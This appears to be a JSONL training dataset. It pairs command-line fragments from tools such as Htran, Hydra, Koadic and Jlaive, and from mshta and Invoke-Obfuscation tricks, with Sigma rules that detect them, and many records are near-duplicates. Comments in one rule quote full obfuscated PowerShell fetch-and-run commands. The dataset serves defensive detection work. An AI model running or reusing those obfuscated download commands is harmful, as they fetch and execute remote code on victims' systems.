{"instruction": "Write Sigma rule to detect payload:", "input": "\\htran.exe -tran .exe \\lcx.exe -slave .exe", "output": "title: HackTool - Htran/NATBypass Execution\nid: f5e3b62f-e577-4e59-931e-0a15b2b94e1e\nstatus: test\ndescription: Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\nreferences:\n    - https://github.com/HiwinCN/HTran\n    - https://github.com/cw1997/NATBypass\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-12-27\nmodified: 2023-02-04\ntags:\n    - attack.command-and-control\n    - attack.t1090\n    - attack.s0040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\htran.exe'\n            - '\\lcx.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.exe -tran '\n            - '.exe -slave '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-u -p ^USER^ ^PASS^", "output": "title: HackTool - Hydra Password Bruteforce Execution\nid: aaafa146-074c-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects command line parameters used by Hydra password guessing hack tool\nreferences:\n    - https://github.com/vanhauser-thc/thc-hydra\nauthor: Vasiliy Burov\ndate: 2020-10-05\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110\n    - attack.t1110.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '-u '\n            - '-p '\n        CommandLine|contains:\n            - '^USER^'\n            - '^PASS^'\n    condition: selection\nfalsepositives:\n    - Software that uses the caret encased keywords PASS and USER in its command line\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-u -p ^USER^ \"^PASS^\"", "output": "title: HackTool - Hydra Password Bruteforce Execution\nid: aaafa146-074c-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects command line parameters used by Hydra password guessing hack tool\nreferences:\n    - https://github.com/vanhauser-thc/thc-hydra\nauthor: Vasiliy Burov\ndate: 2020-10-05\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110\n    - attack.t1110.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '-u '\n            - '-p '\n        CommandLine|contains:\n            - '^USER^'\n            - '^PASS^'\n    condition: selection\nfalsepositives:\n    - Software that uses the caret encased keywords PASS and USER in its command line\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-u -p ^USER^ ^PASS^", "output": "title: HackTool - Hydra Password Bruteforce Execution\nid: aaafa146-074c-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects command line parameters used by Hydra password guessing hack tool\nreferences:\n    - https://github.com/vanhauser-thc/thc-hydra\nauthor: Vasiliy Burov\ndate: 2020-10-05\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110\n    - attack.t1110.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '-u '\n            - '-p '\n        CommandLine|contains:\n            - '^USER^'\n            - '^PASS^'\n    condition: selection\nfalsepositives:\n    - Software that uses the caret encased keywords PASS and USER in its command line\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "set && mshta vbscript:createobject .run (window.close)", "output": "title: Invoke-Obfuscation Via Use MSHTA\nid: ac20ae82-8758-4f38-958e-b44a3140ca88\nstatus: test\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009   # (Task31)\nauthor: Nikita Nazarov, oscd.community\ndate: 2020-10-08\nmodified: 2022-03-08\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "set && mshta vbscript:createobject .run (window.close)", "output": "title: Invoke-Obfuscation Via Use MSHTA\nid: ac20ae82-8758-4f38-958e-b44a3140ca88\nstatus: test\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009   # (Task31)\nauthor: Nikita Nazarov, oscd.community\ndate: 2020-10-08\nmodified: 2022-03-08\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "set && mshta vbs:createobject .run (window.close)", "output": "title: Invoke-Obfuscation Via Use MSHTA\nid: ac20ae82-8758-4f38-958e-b44a3140ca88\nstatus: test\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009   # (Task31)\nauthor: Nikita Nazarov, oscd.community\ndate: 2020-10-08\nmodified: 2022-03-08\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "set && mshta vbscript:createobject .run (window.close)", "output": "title: Invoke-Obfuscation Via Use MSHTA\nid: ac20ae82-8758-4f38-958e-b44a3140ca88\nstatus: test\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009   # (Task31)\nauthor: Nikita Nazarov, oscd.community\ndate: 2020-10-08\nmodified: 2022-03-08\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "&&set cmd /c -f {0} {1} {2} {3} {4} {5}", "output": "title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\nid: e9f55347-2928-4c06-88e5-1a7f8169942e\nstatus: test\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009 # (Task27)\nauthor: Timur Zinniatullin, oscd.community\ndate: 2020-10-13\nmodified: 2022-11-16\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # CommandLine|re: '(?i)&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        CommandLine|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        CommandLine|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "&&set cmd /c -f {0} {1} {2} {3} {4} {5}", "output": "title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\nid: e9f55347-2928-4c06-88e5-1a7f8169942e\nstatus: test\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009 # (Task27)\nauthor: Timur Zinniatullin, oscd.community\ndate: 2020-10-13\nmodified: 2022-11-16\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # CommandLine|re: '(?i)&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        CommandLine|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        CommandLine|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "&&set cmd -c -f {0} {1} {2} {3} {4} {5}", "output": "title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\nid: e9f55347-2928-4c06-88e5-1a7f8169942e\nstatus: test\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009 # (Task27)\nauthor: Timur Zinniatullin, oscd.community\ndate: 2020-10-13\nmodified: 2022-11-16\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # CommandLine|re: '(?i)&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        CommandLine|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        CommandLine|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "&&set cmd /c -f {0} {1} {2} {3} {4} {5}", "output": "title: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\nid: e9f55347-2928-4c06-88e5-1a7f8169942e\nstatus: test\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\nreferences:\n    - https://github.com/SigmaHQ/sigma/issues/1009 # (Task27)\nauthor: Timur Zinniatullin, oscd.community\ndate: 2020-10-13\nmodified: 2022-11-16\ntags:\n    - attack.defense-evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # CommandLine|re: '(?i)&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        CommandLine|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        CommandLine|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\xcopy.exe powershell.exe .bat.exe \\xcopy.exe pwsh.exe .bat.exe \\attrib.exe +s +h .bat.exe", "output": "title: HackTool - Jlaive In-Memory Assembly Execution\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\nstatus: test\ndescription: Detects the use of Jlaive to execute assemblies in a copied PowerShell\nreferences:\n    - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool\n    - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022-05-24\nmodified: 2023-02-22\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    parent_selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|endswith: '.bat'\n    selection1:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'powershell.exe'\n            - '.bat.exe'\n    selection2:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'pwsh.exe'\n            - '.bat.exe'\n    selection3:\n        Image|endswith: '\\attrib.exe'\n        CommandLine|contains|all:\n            - '+s'\n            - '+h'\n            - '.bat.exe'\n    condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\xcopy.exe powershell.exe .bat.exe \\xcopy.exe pwsh.exe .bat.exe \\attr\\\"ib.exe\\\" +s +h .bat.exe", "output": "title: HackTool - Jlaive In-Memory Assembly Execution\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\nstatus: test\ndescription: Detects the use of Jlaive to execute assemblies in a copied PowerShell\nreferences:\n    - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool\n    - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022-05-24\nmodified: 2023-02-22\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    parent_selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|endswith: '.bat'\n    selection1:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'powershell.exe'\n            - '.bat.exe'\n    selection2:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'pwsh.exe'\n            - '.bat.exe'\n    selection3:\n        Image|endswith: '\\attrib.exe'\n        CommandLine|contains|all:\n            - '+s'\n            - '+h'\n            - '.bat.exe'\n    condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\xcopy.exe powershell.exe .bat.exe \\xcopy.exe pwsh.exe .bat.exe \\attrib.exe +s +h .bat.exe", "output": "title: HackTool - Jlaive In-Memory Assembly Execution\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\nstatus: test\ndescription: Detects the use of Jlaive to execute assemblies in a copied PowerShell\nreferences:\n    - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool\n    - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022-05-24\nmodified: 2023-02-22\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    parent_selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|endswith: '.bat'\n    selection1:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'powershell.exe'\n            - '.bat.exe'\n    selection2:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'pwsh.exe'\n            - '.bat.exe'\n    selection3:\n        Image|endswith: '\\attrib.exe'\n        CommandLine|contains|all:\n            - '+s'\n            - '+h'\n            - '.bat.exe'\n    condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd \\xcopy powershell \\xcopy pwsh \\attrib +s +h", "output": "title: HackTool - Jlaive In-Memory Assembly Execution\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\nstatus: test\ndescription: Detects the use of Jlaive to execute assemblies in a copied PowerShell\nreferences:\n    - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool\n    - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022-05-24\nmodified: 2023-02-22\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    parent_selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|endswith: '.bat'\n    selection1:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'powershell.exe'\n            - '.bat.exe'\n    selection2:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'pwsh.exe'\n            - '.bat.exe'\n    selection3:\n        Image|endswith: '\\attrib.exe'\n        CommandLine|contains|all:\n            - '+s'\n            - '+h'\n            - '.bat.exe'\n    condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\xcopy.exe powershell.exe .bat.exe \\xcopy.exe pwsh.exe .bat.exe \\attrib.exe +s +h .bat.exe", "output": "title: HackTool - Jlaive In-Memory Assembly Execution\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\nstatus: test\ndescription: Detects the use of Jlaive to execute assemblies in a copied PowerShell\nreferences:\n    - https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool\n    - https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022-05-24\nmodified: 2023-02-22\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    parent_selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|endswith: '.bat'\n    selection1:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'powershell.exe'\n            - '.bat.exe'\n    selection2:\n        Image|endswith: '\\xcopy.exe'\n        CommandLine|contains|all:\n            - 'pwsh.exe'\n            - '.bat.exe'\n    selection3:\n        Image|endswith: '\\attrib.exe'\n        CommandLine|contains|all:\n            - '+s'\n            - '+h'\n            - '.bat.exe'\n    condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe /q /c chcp", "output": "title: HackTool - Koadic Execution\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nstatus: test\ndescription: Detects command line parameters used by Koadic hack tool\nreferences:\n    - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n    - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n    - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nauthor: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020-01-12\nmodified: 2023-02-11\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/q'\n            - '/c'\n            - 'chcp'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\cmd.exe\" Cmd.Exe /q /c chcp", "output": "title: HackTool - Koadic Execution\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nstatus: test\ndescription: Detects command line parameters used by Koadic hack tool\nreferences:\n    - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n    - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n    - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nauthor: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020-01-12\nmodified: 2023-02-11\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/q'\n            - '/c'\n            - 'chcp'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe /q -c chcp", "output": "title: HackTool - Koadic Execution\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nstatus: test\ndescription: Detects command line parameters used by Koadic hack tool\nreferences:\n    - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n    - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n    - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nauthor: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020-01-12\nmodified: 2023-02-11\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/q'\n            - '/c'\n            - 'chcp'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd /q /c chcp", "output": "title: HackTool - Koadic Execution\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nstatus: test\ndescription: Detects command line parameters used by Koadic hack tool\nreferences:\n    - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n    - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n    - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nauthor: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020-01-12\nmodified: 2023-02-11\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/q'\n            - '/c'\n            - 'chcp'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe /q /c chcp", "output": "title: HackTool - Koadic Execution\nid: 5cddf373-ef00-4112-ad72-960ac29bac34\nstatus: test\ndescription: Detects command line parameters used by Koadic hack tool\nreferences:\n    - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/\n    - https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js\n    - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/\nauthor: wagga, Jonhnathan Ribeiro, oscd.community\ndate: 2020-01-12\nmodified: 2023-02-11\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/q'\n            - '/c'\n            - 'chcp'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
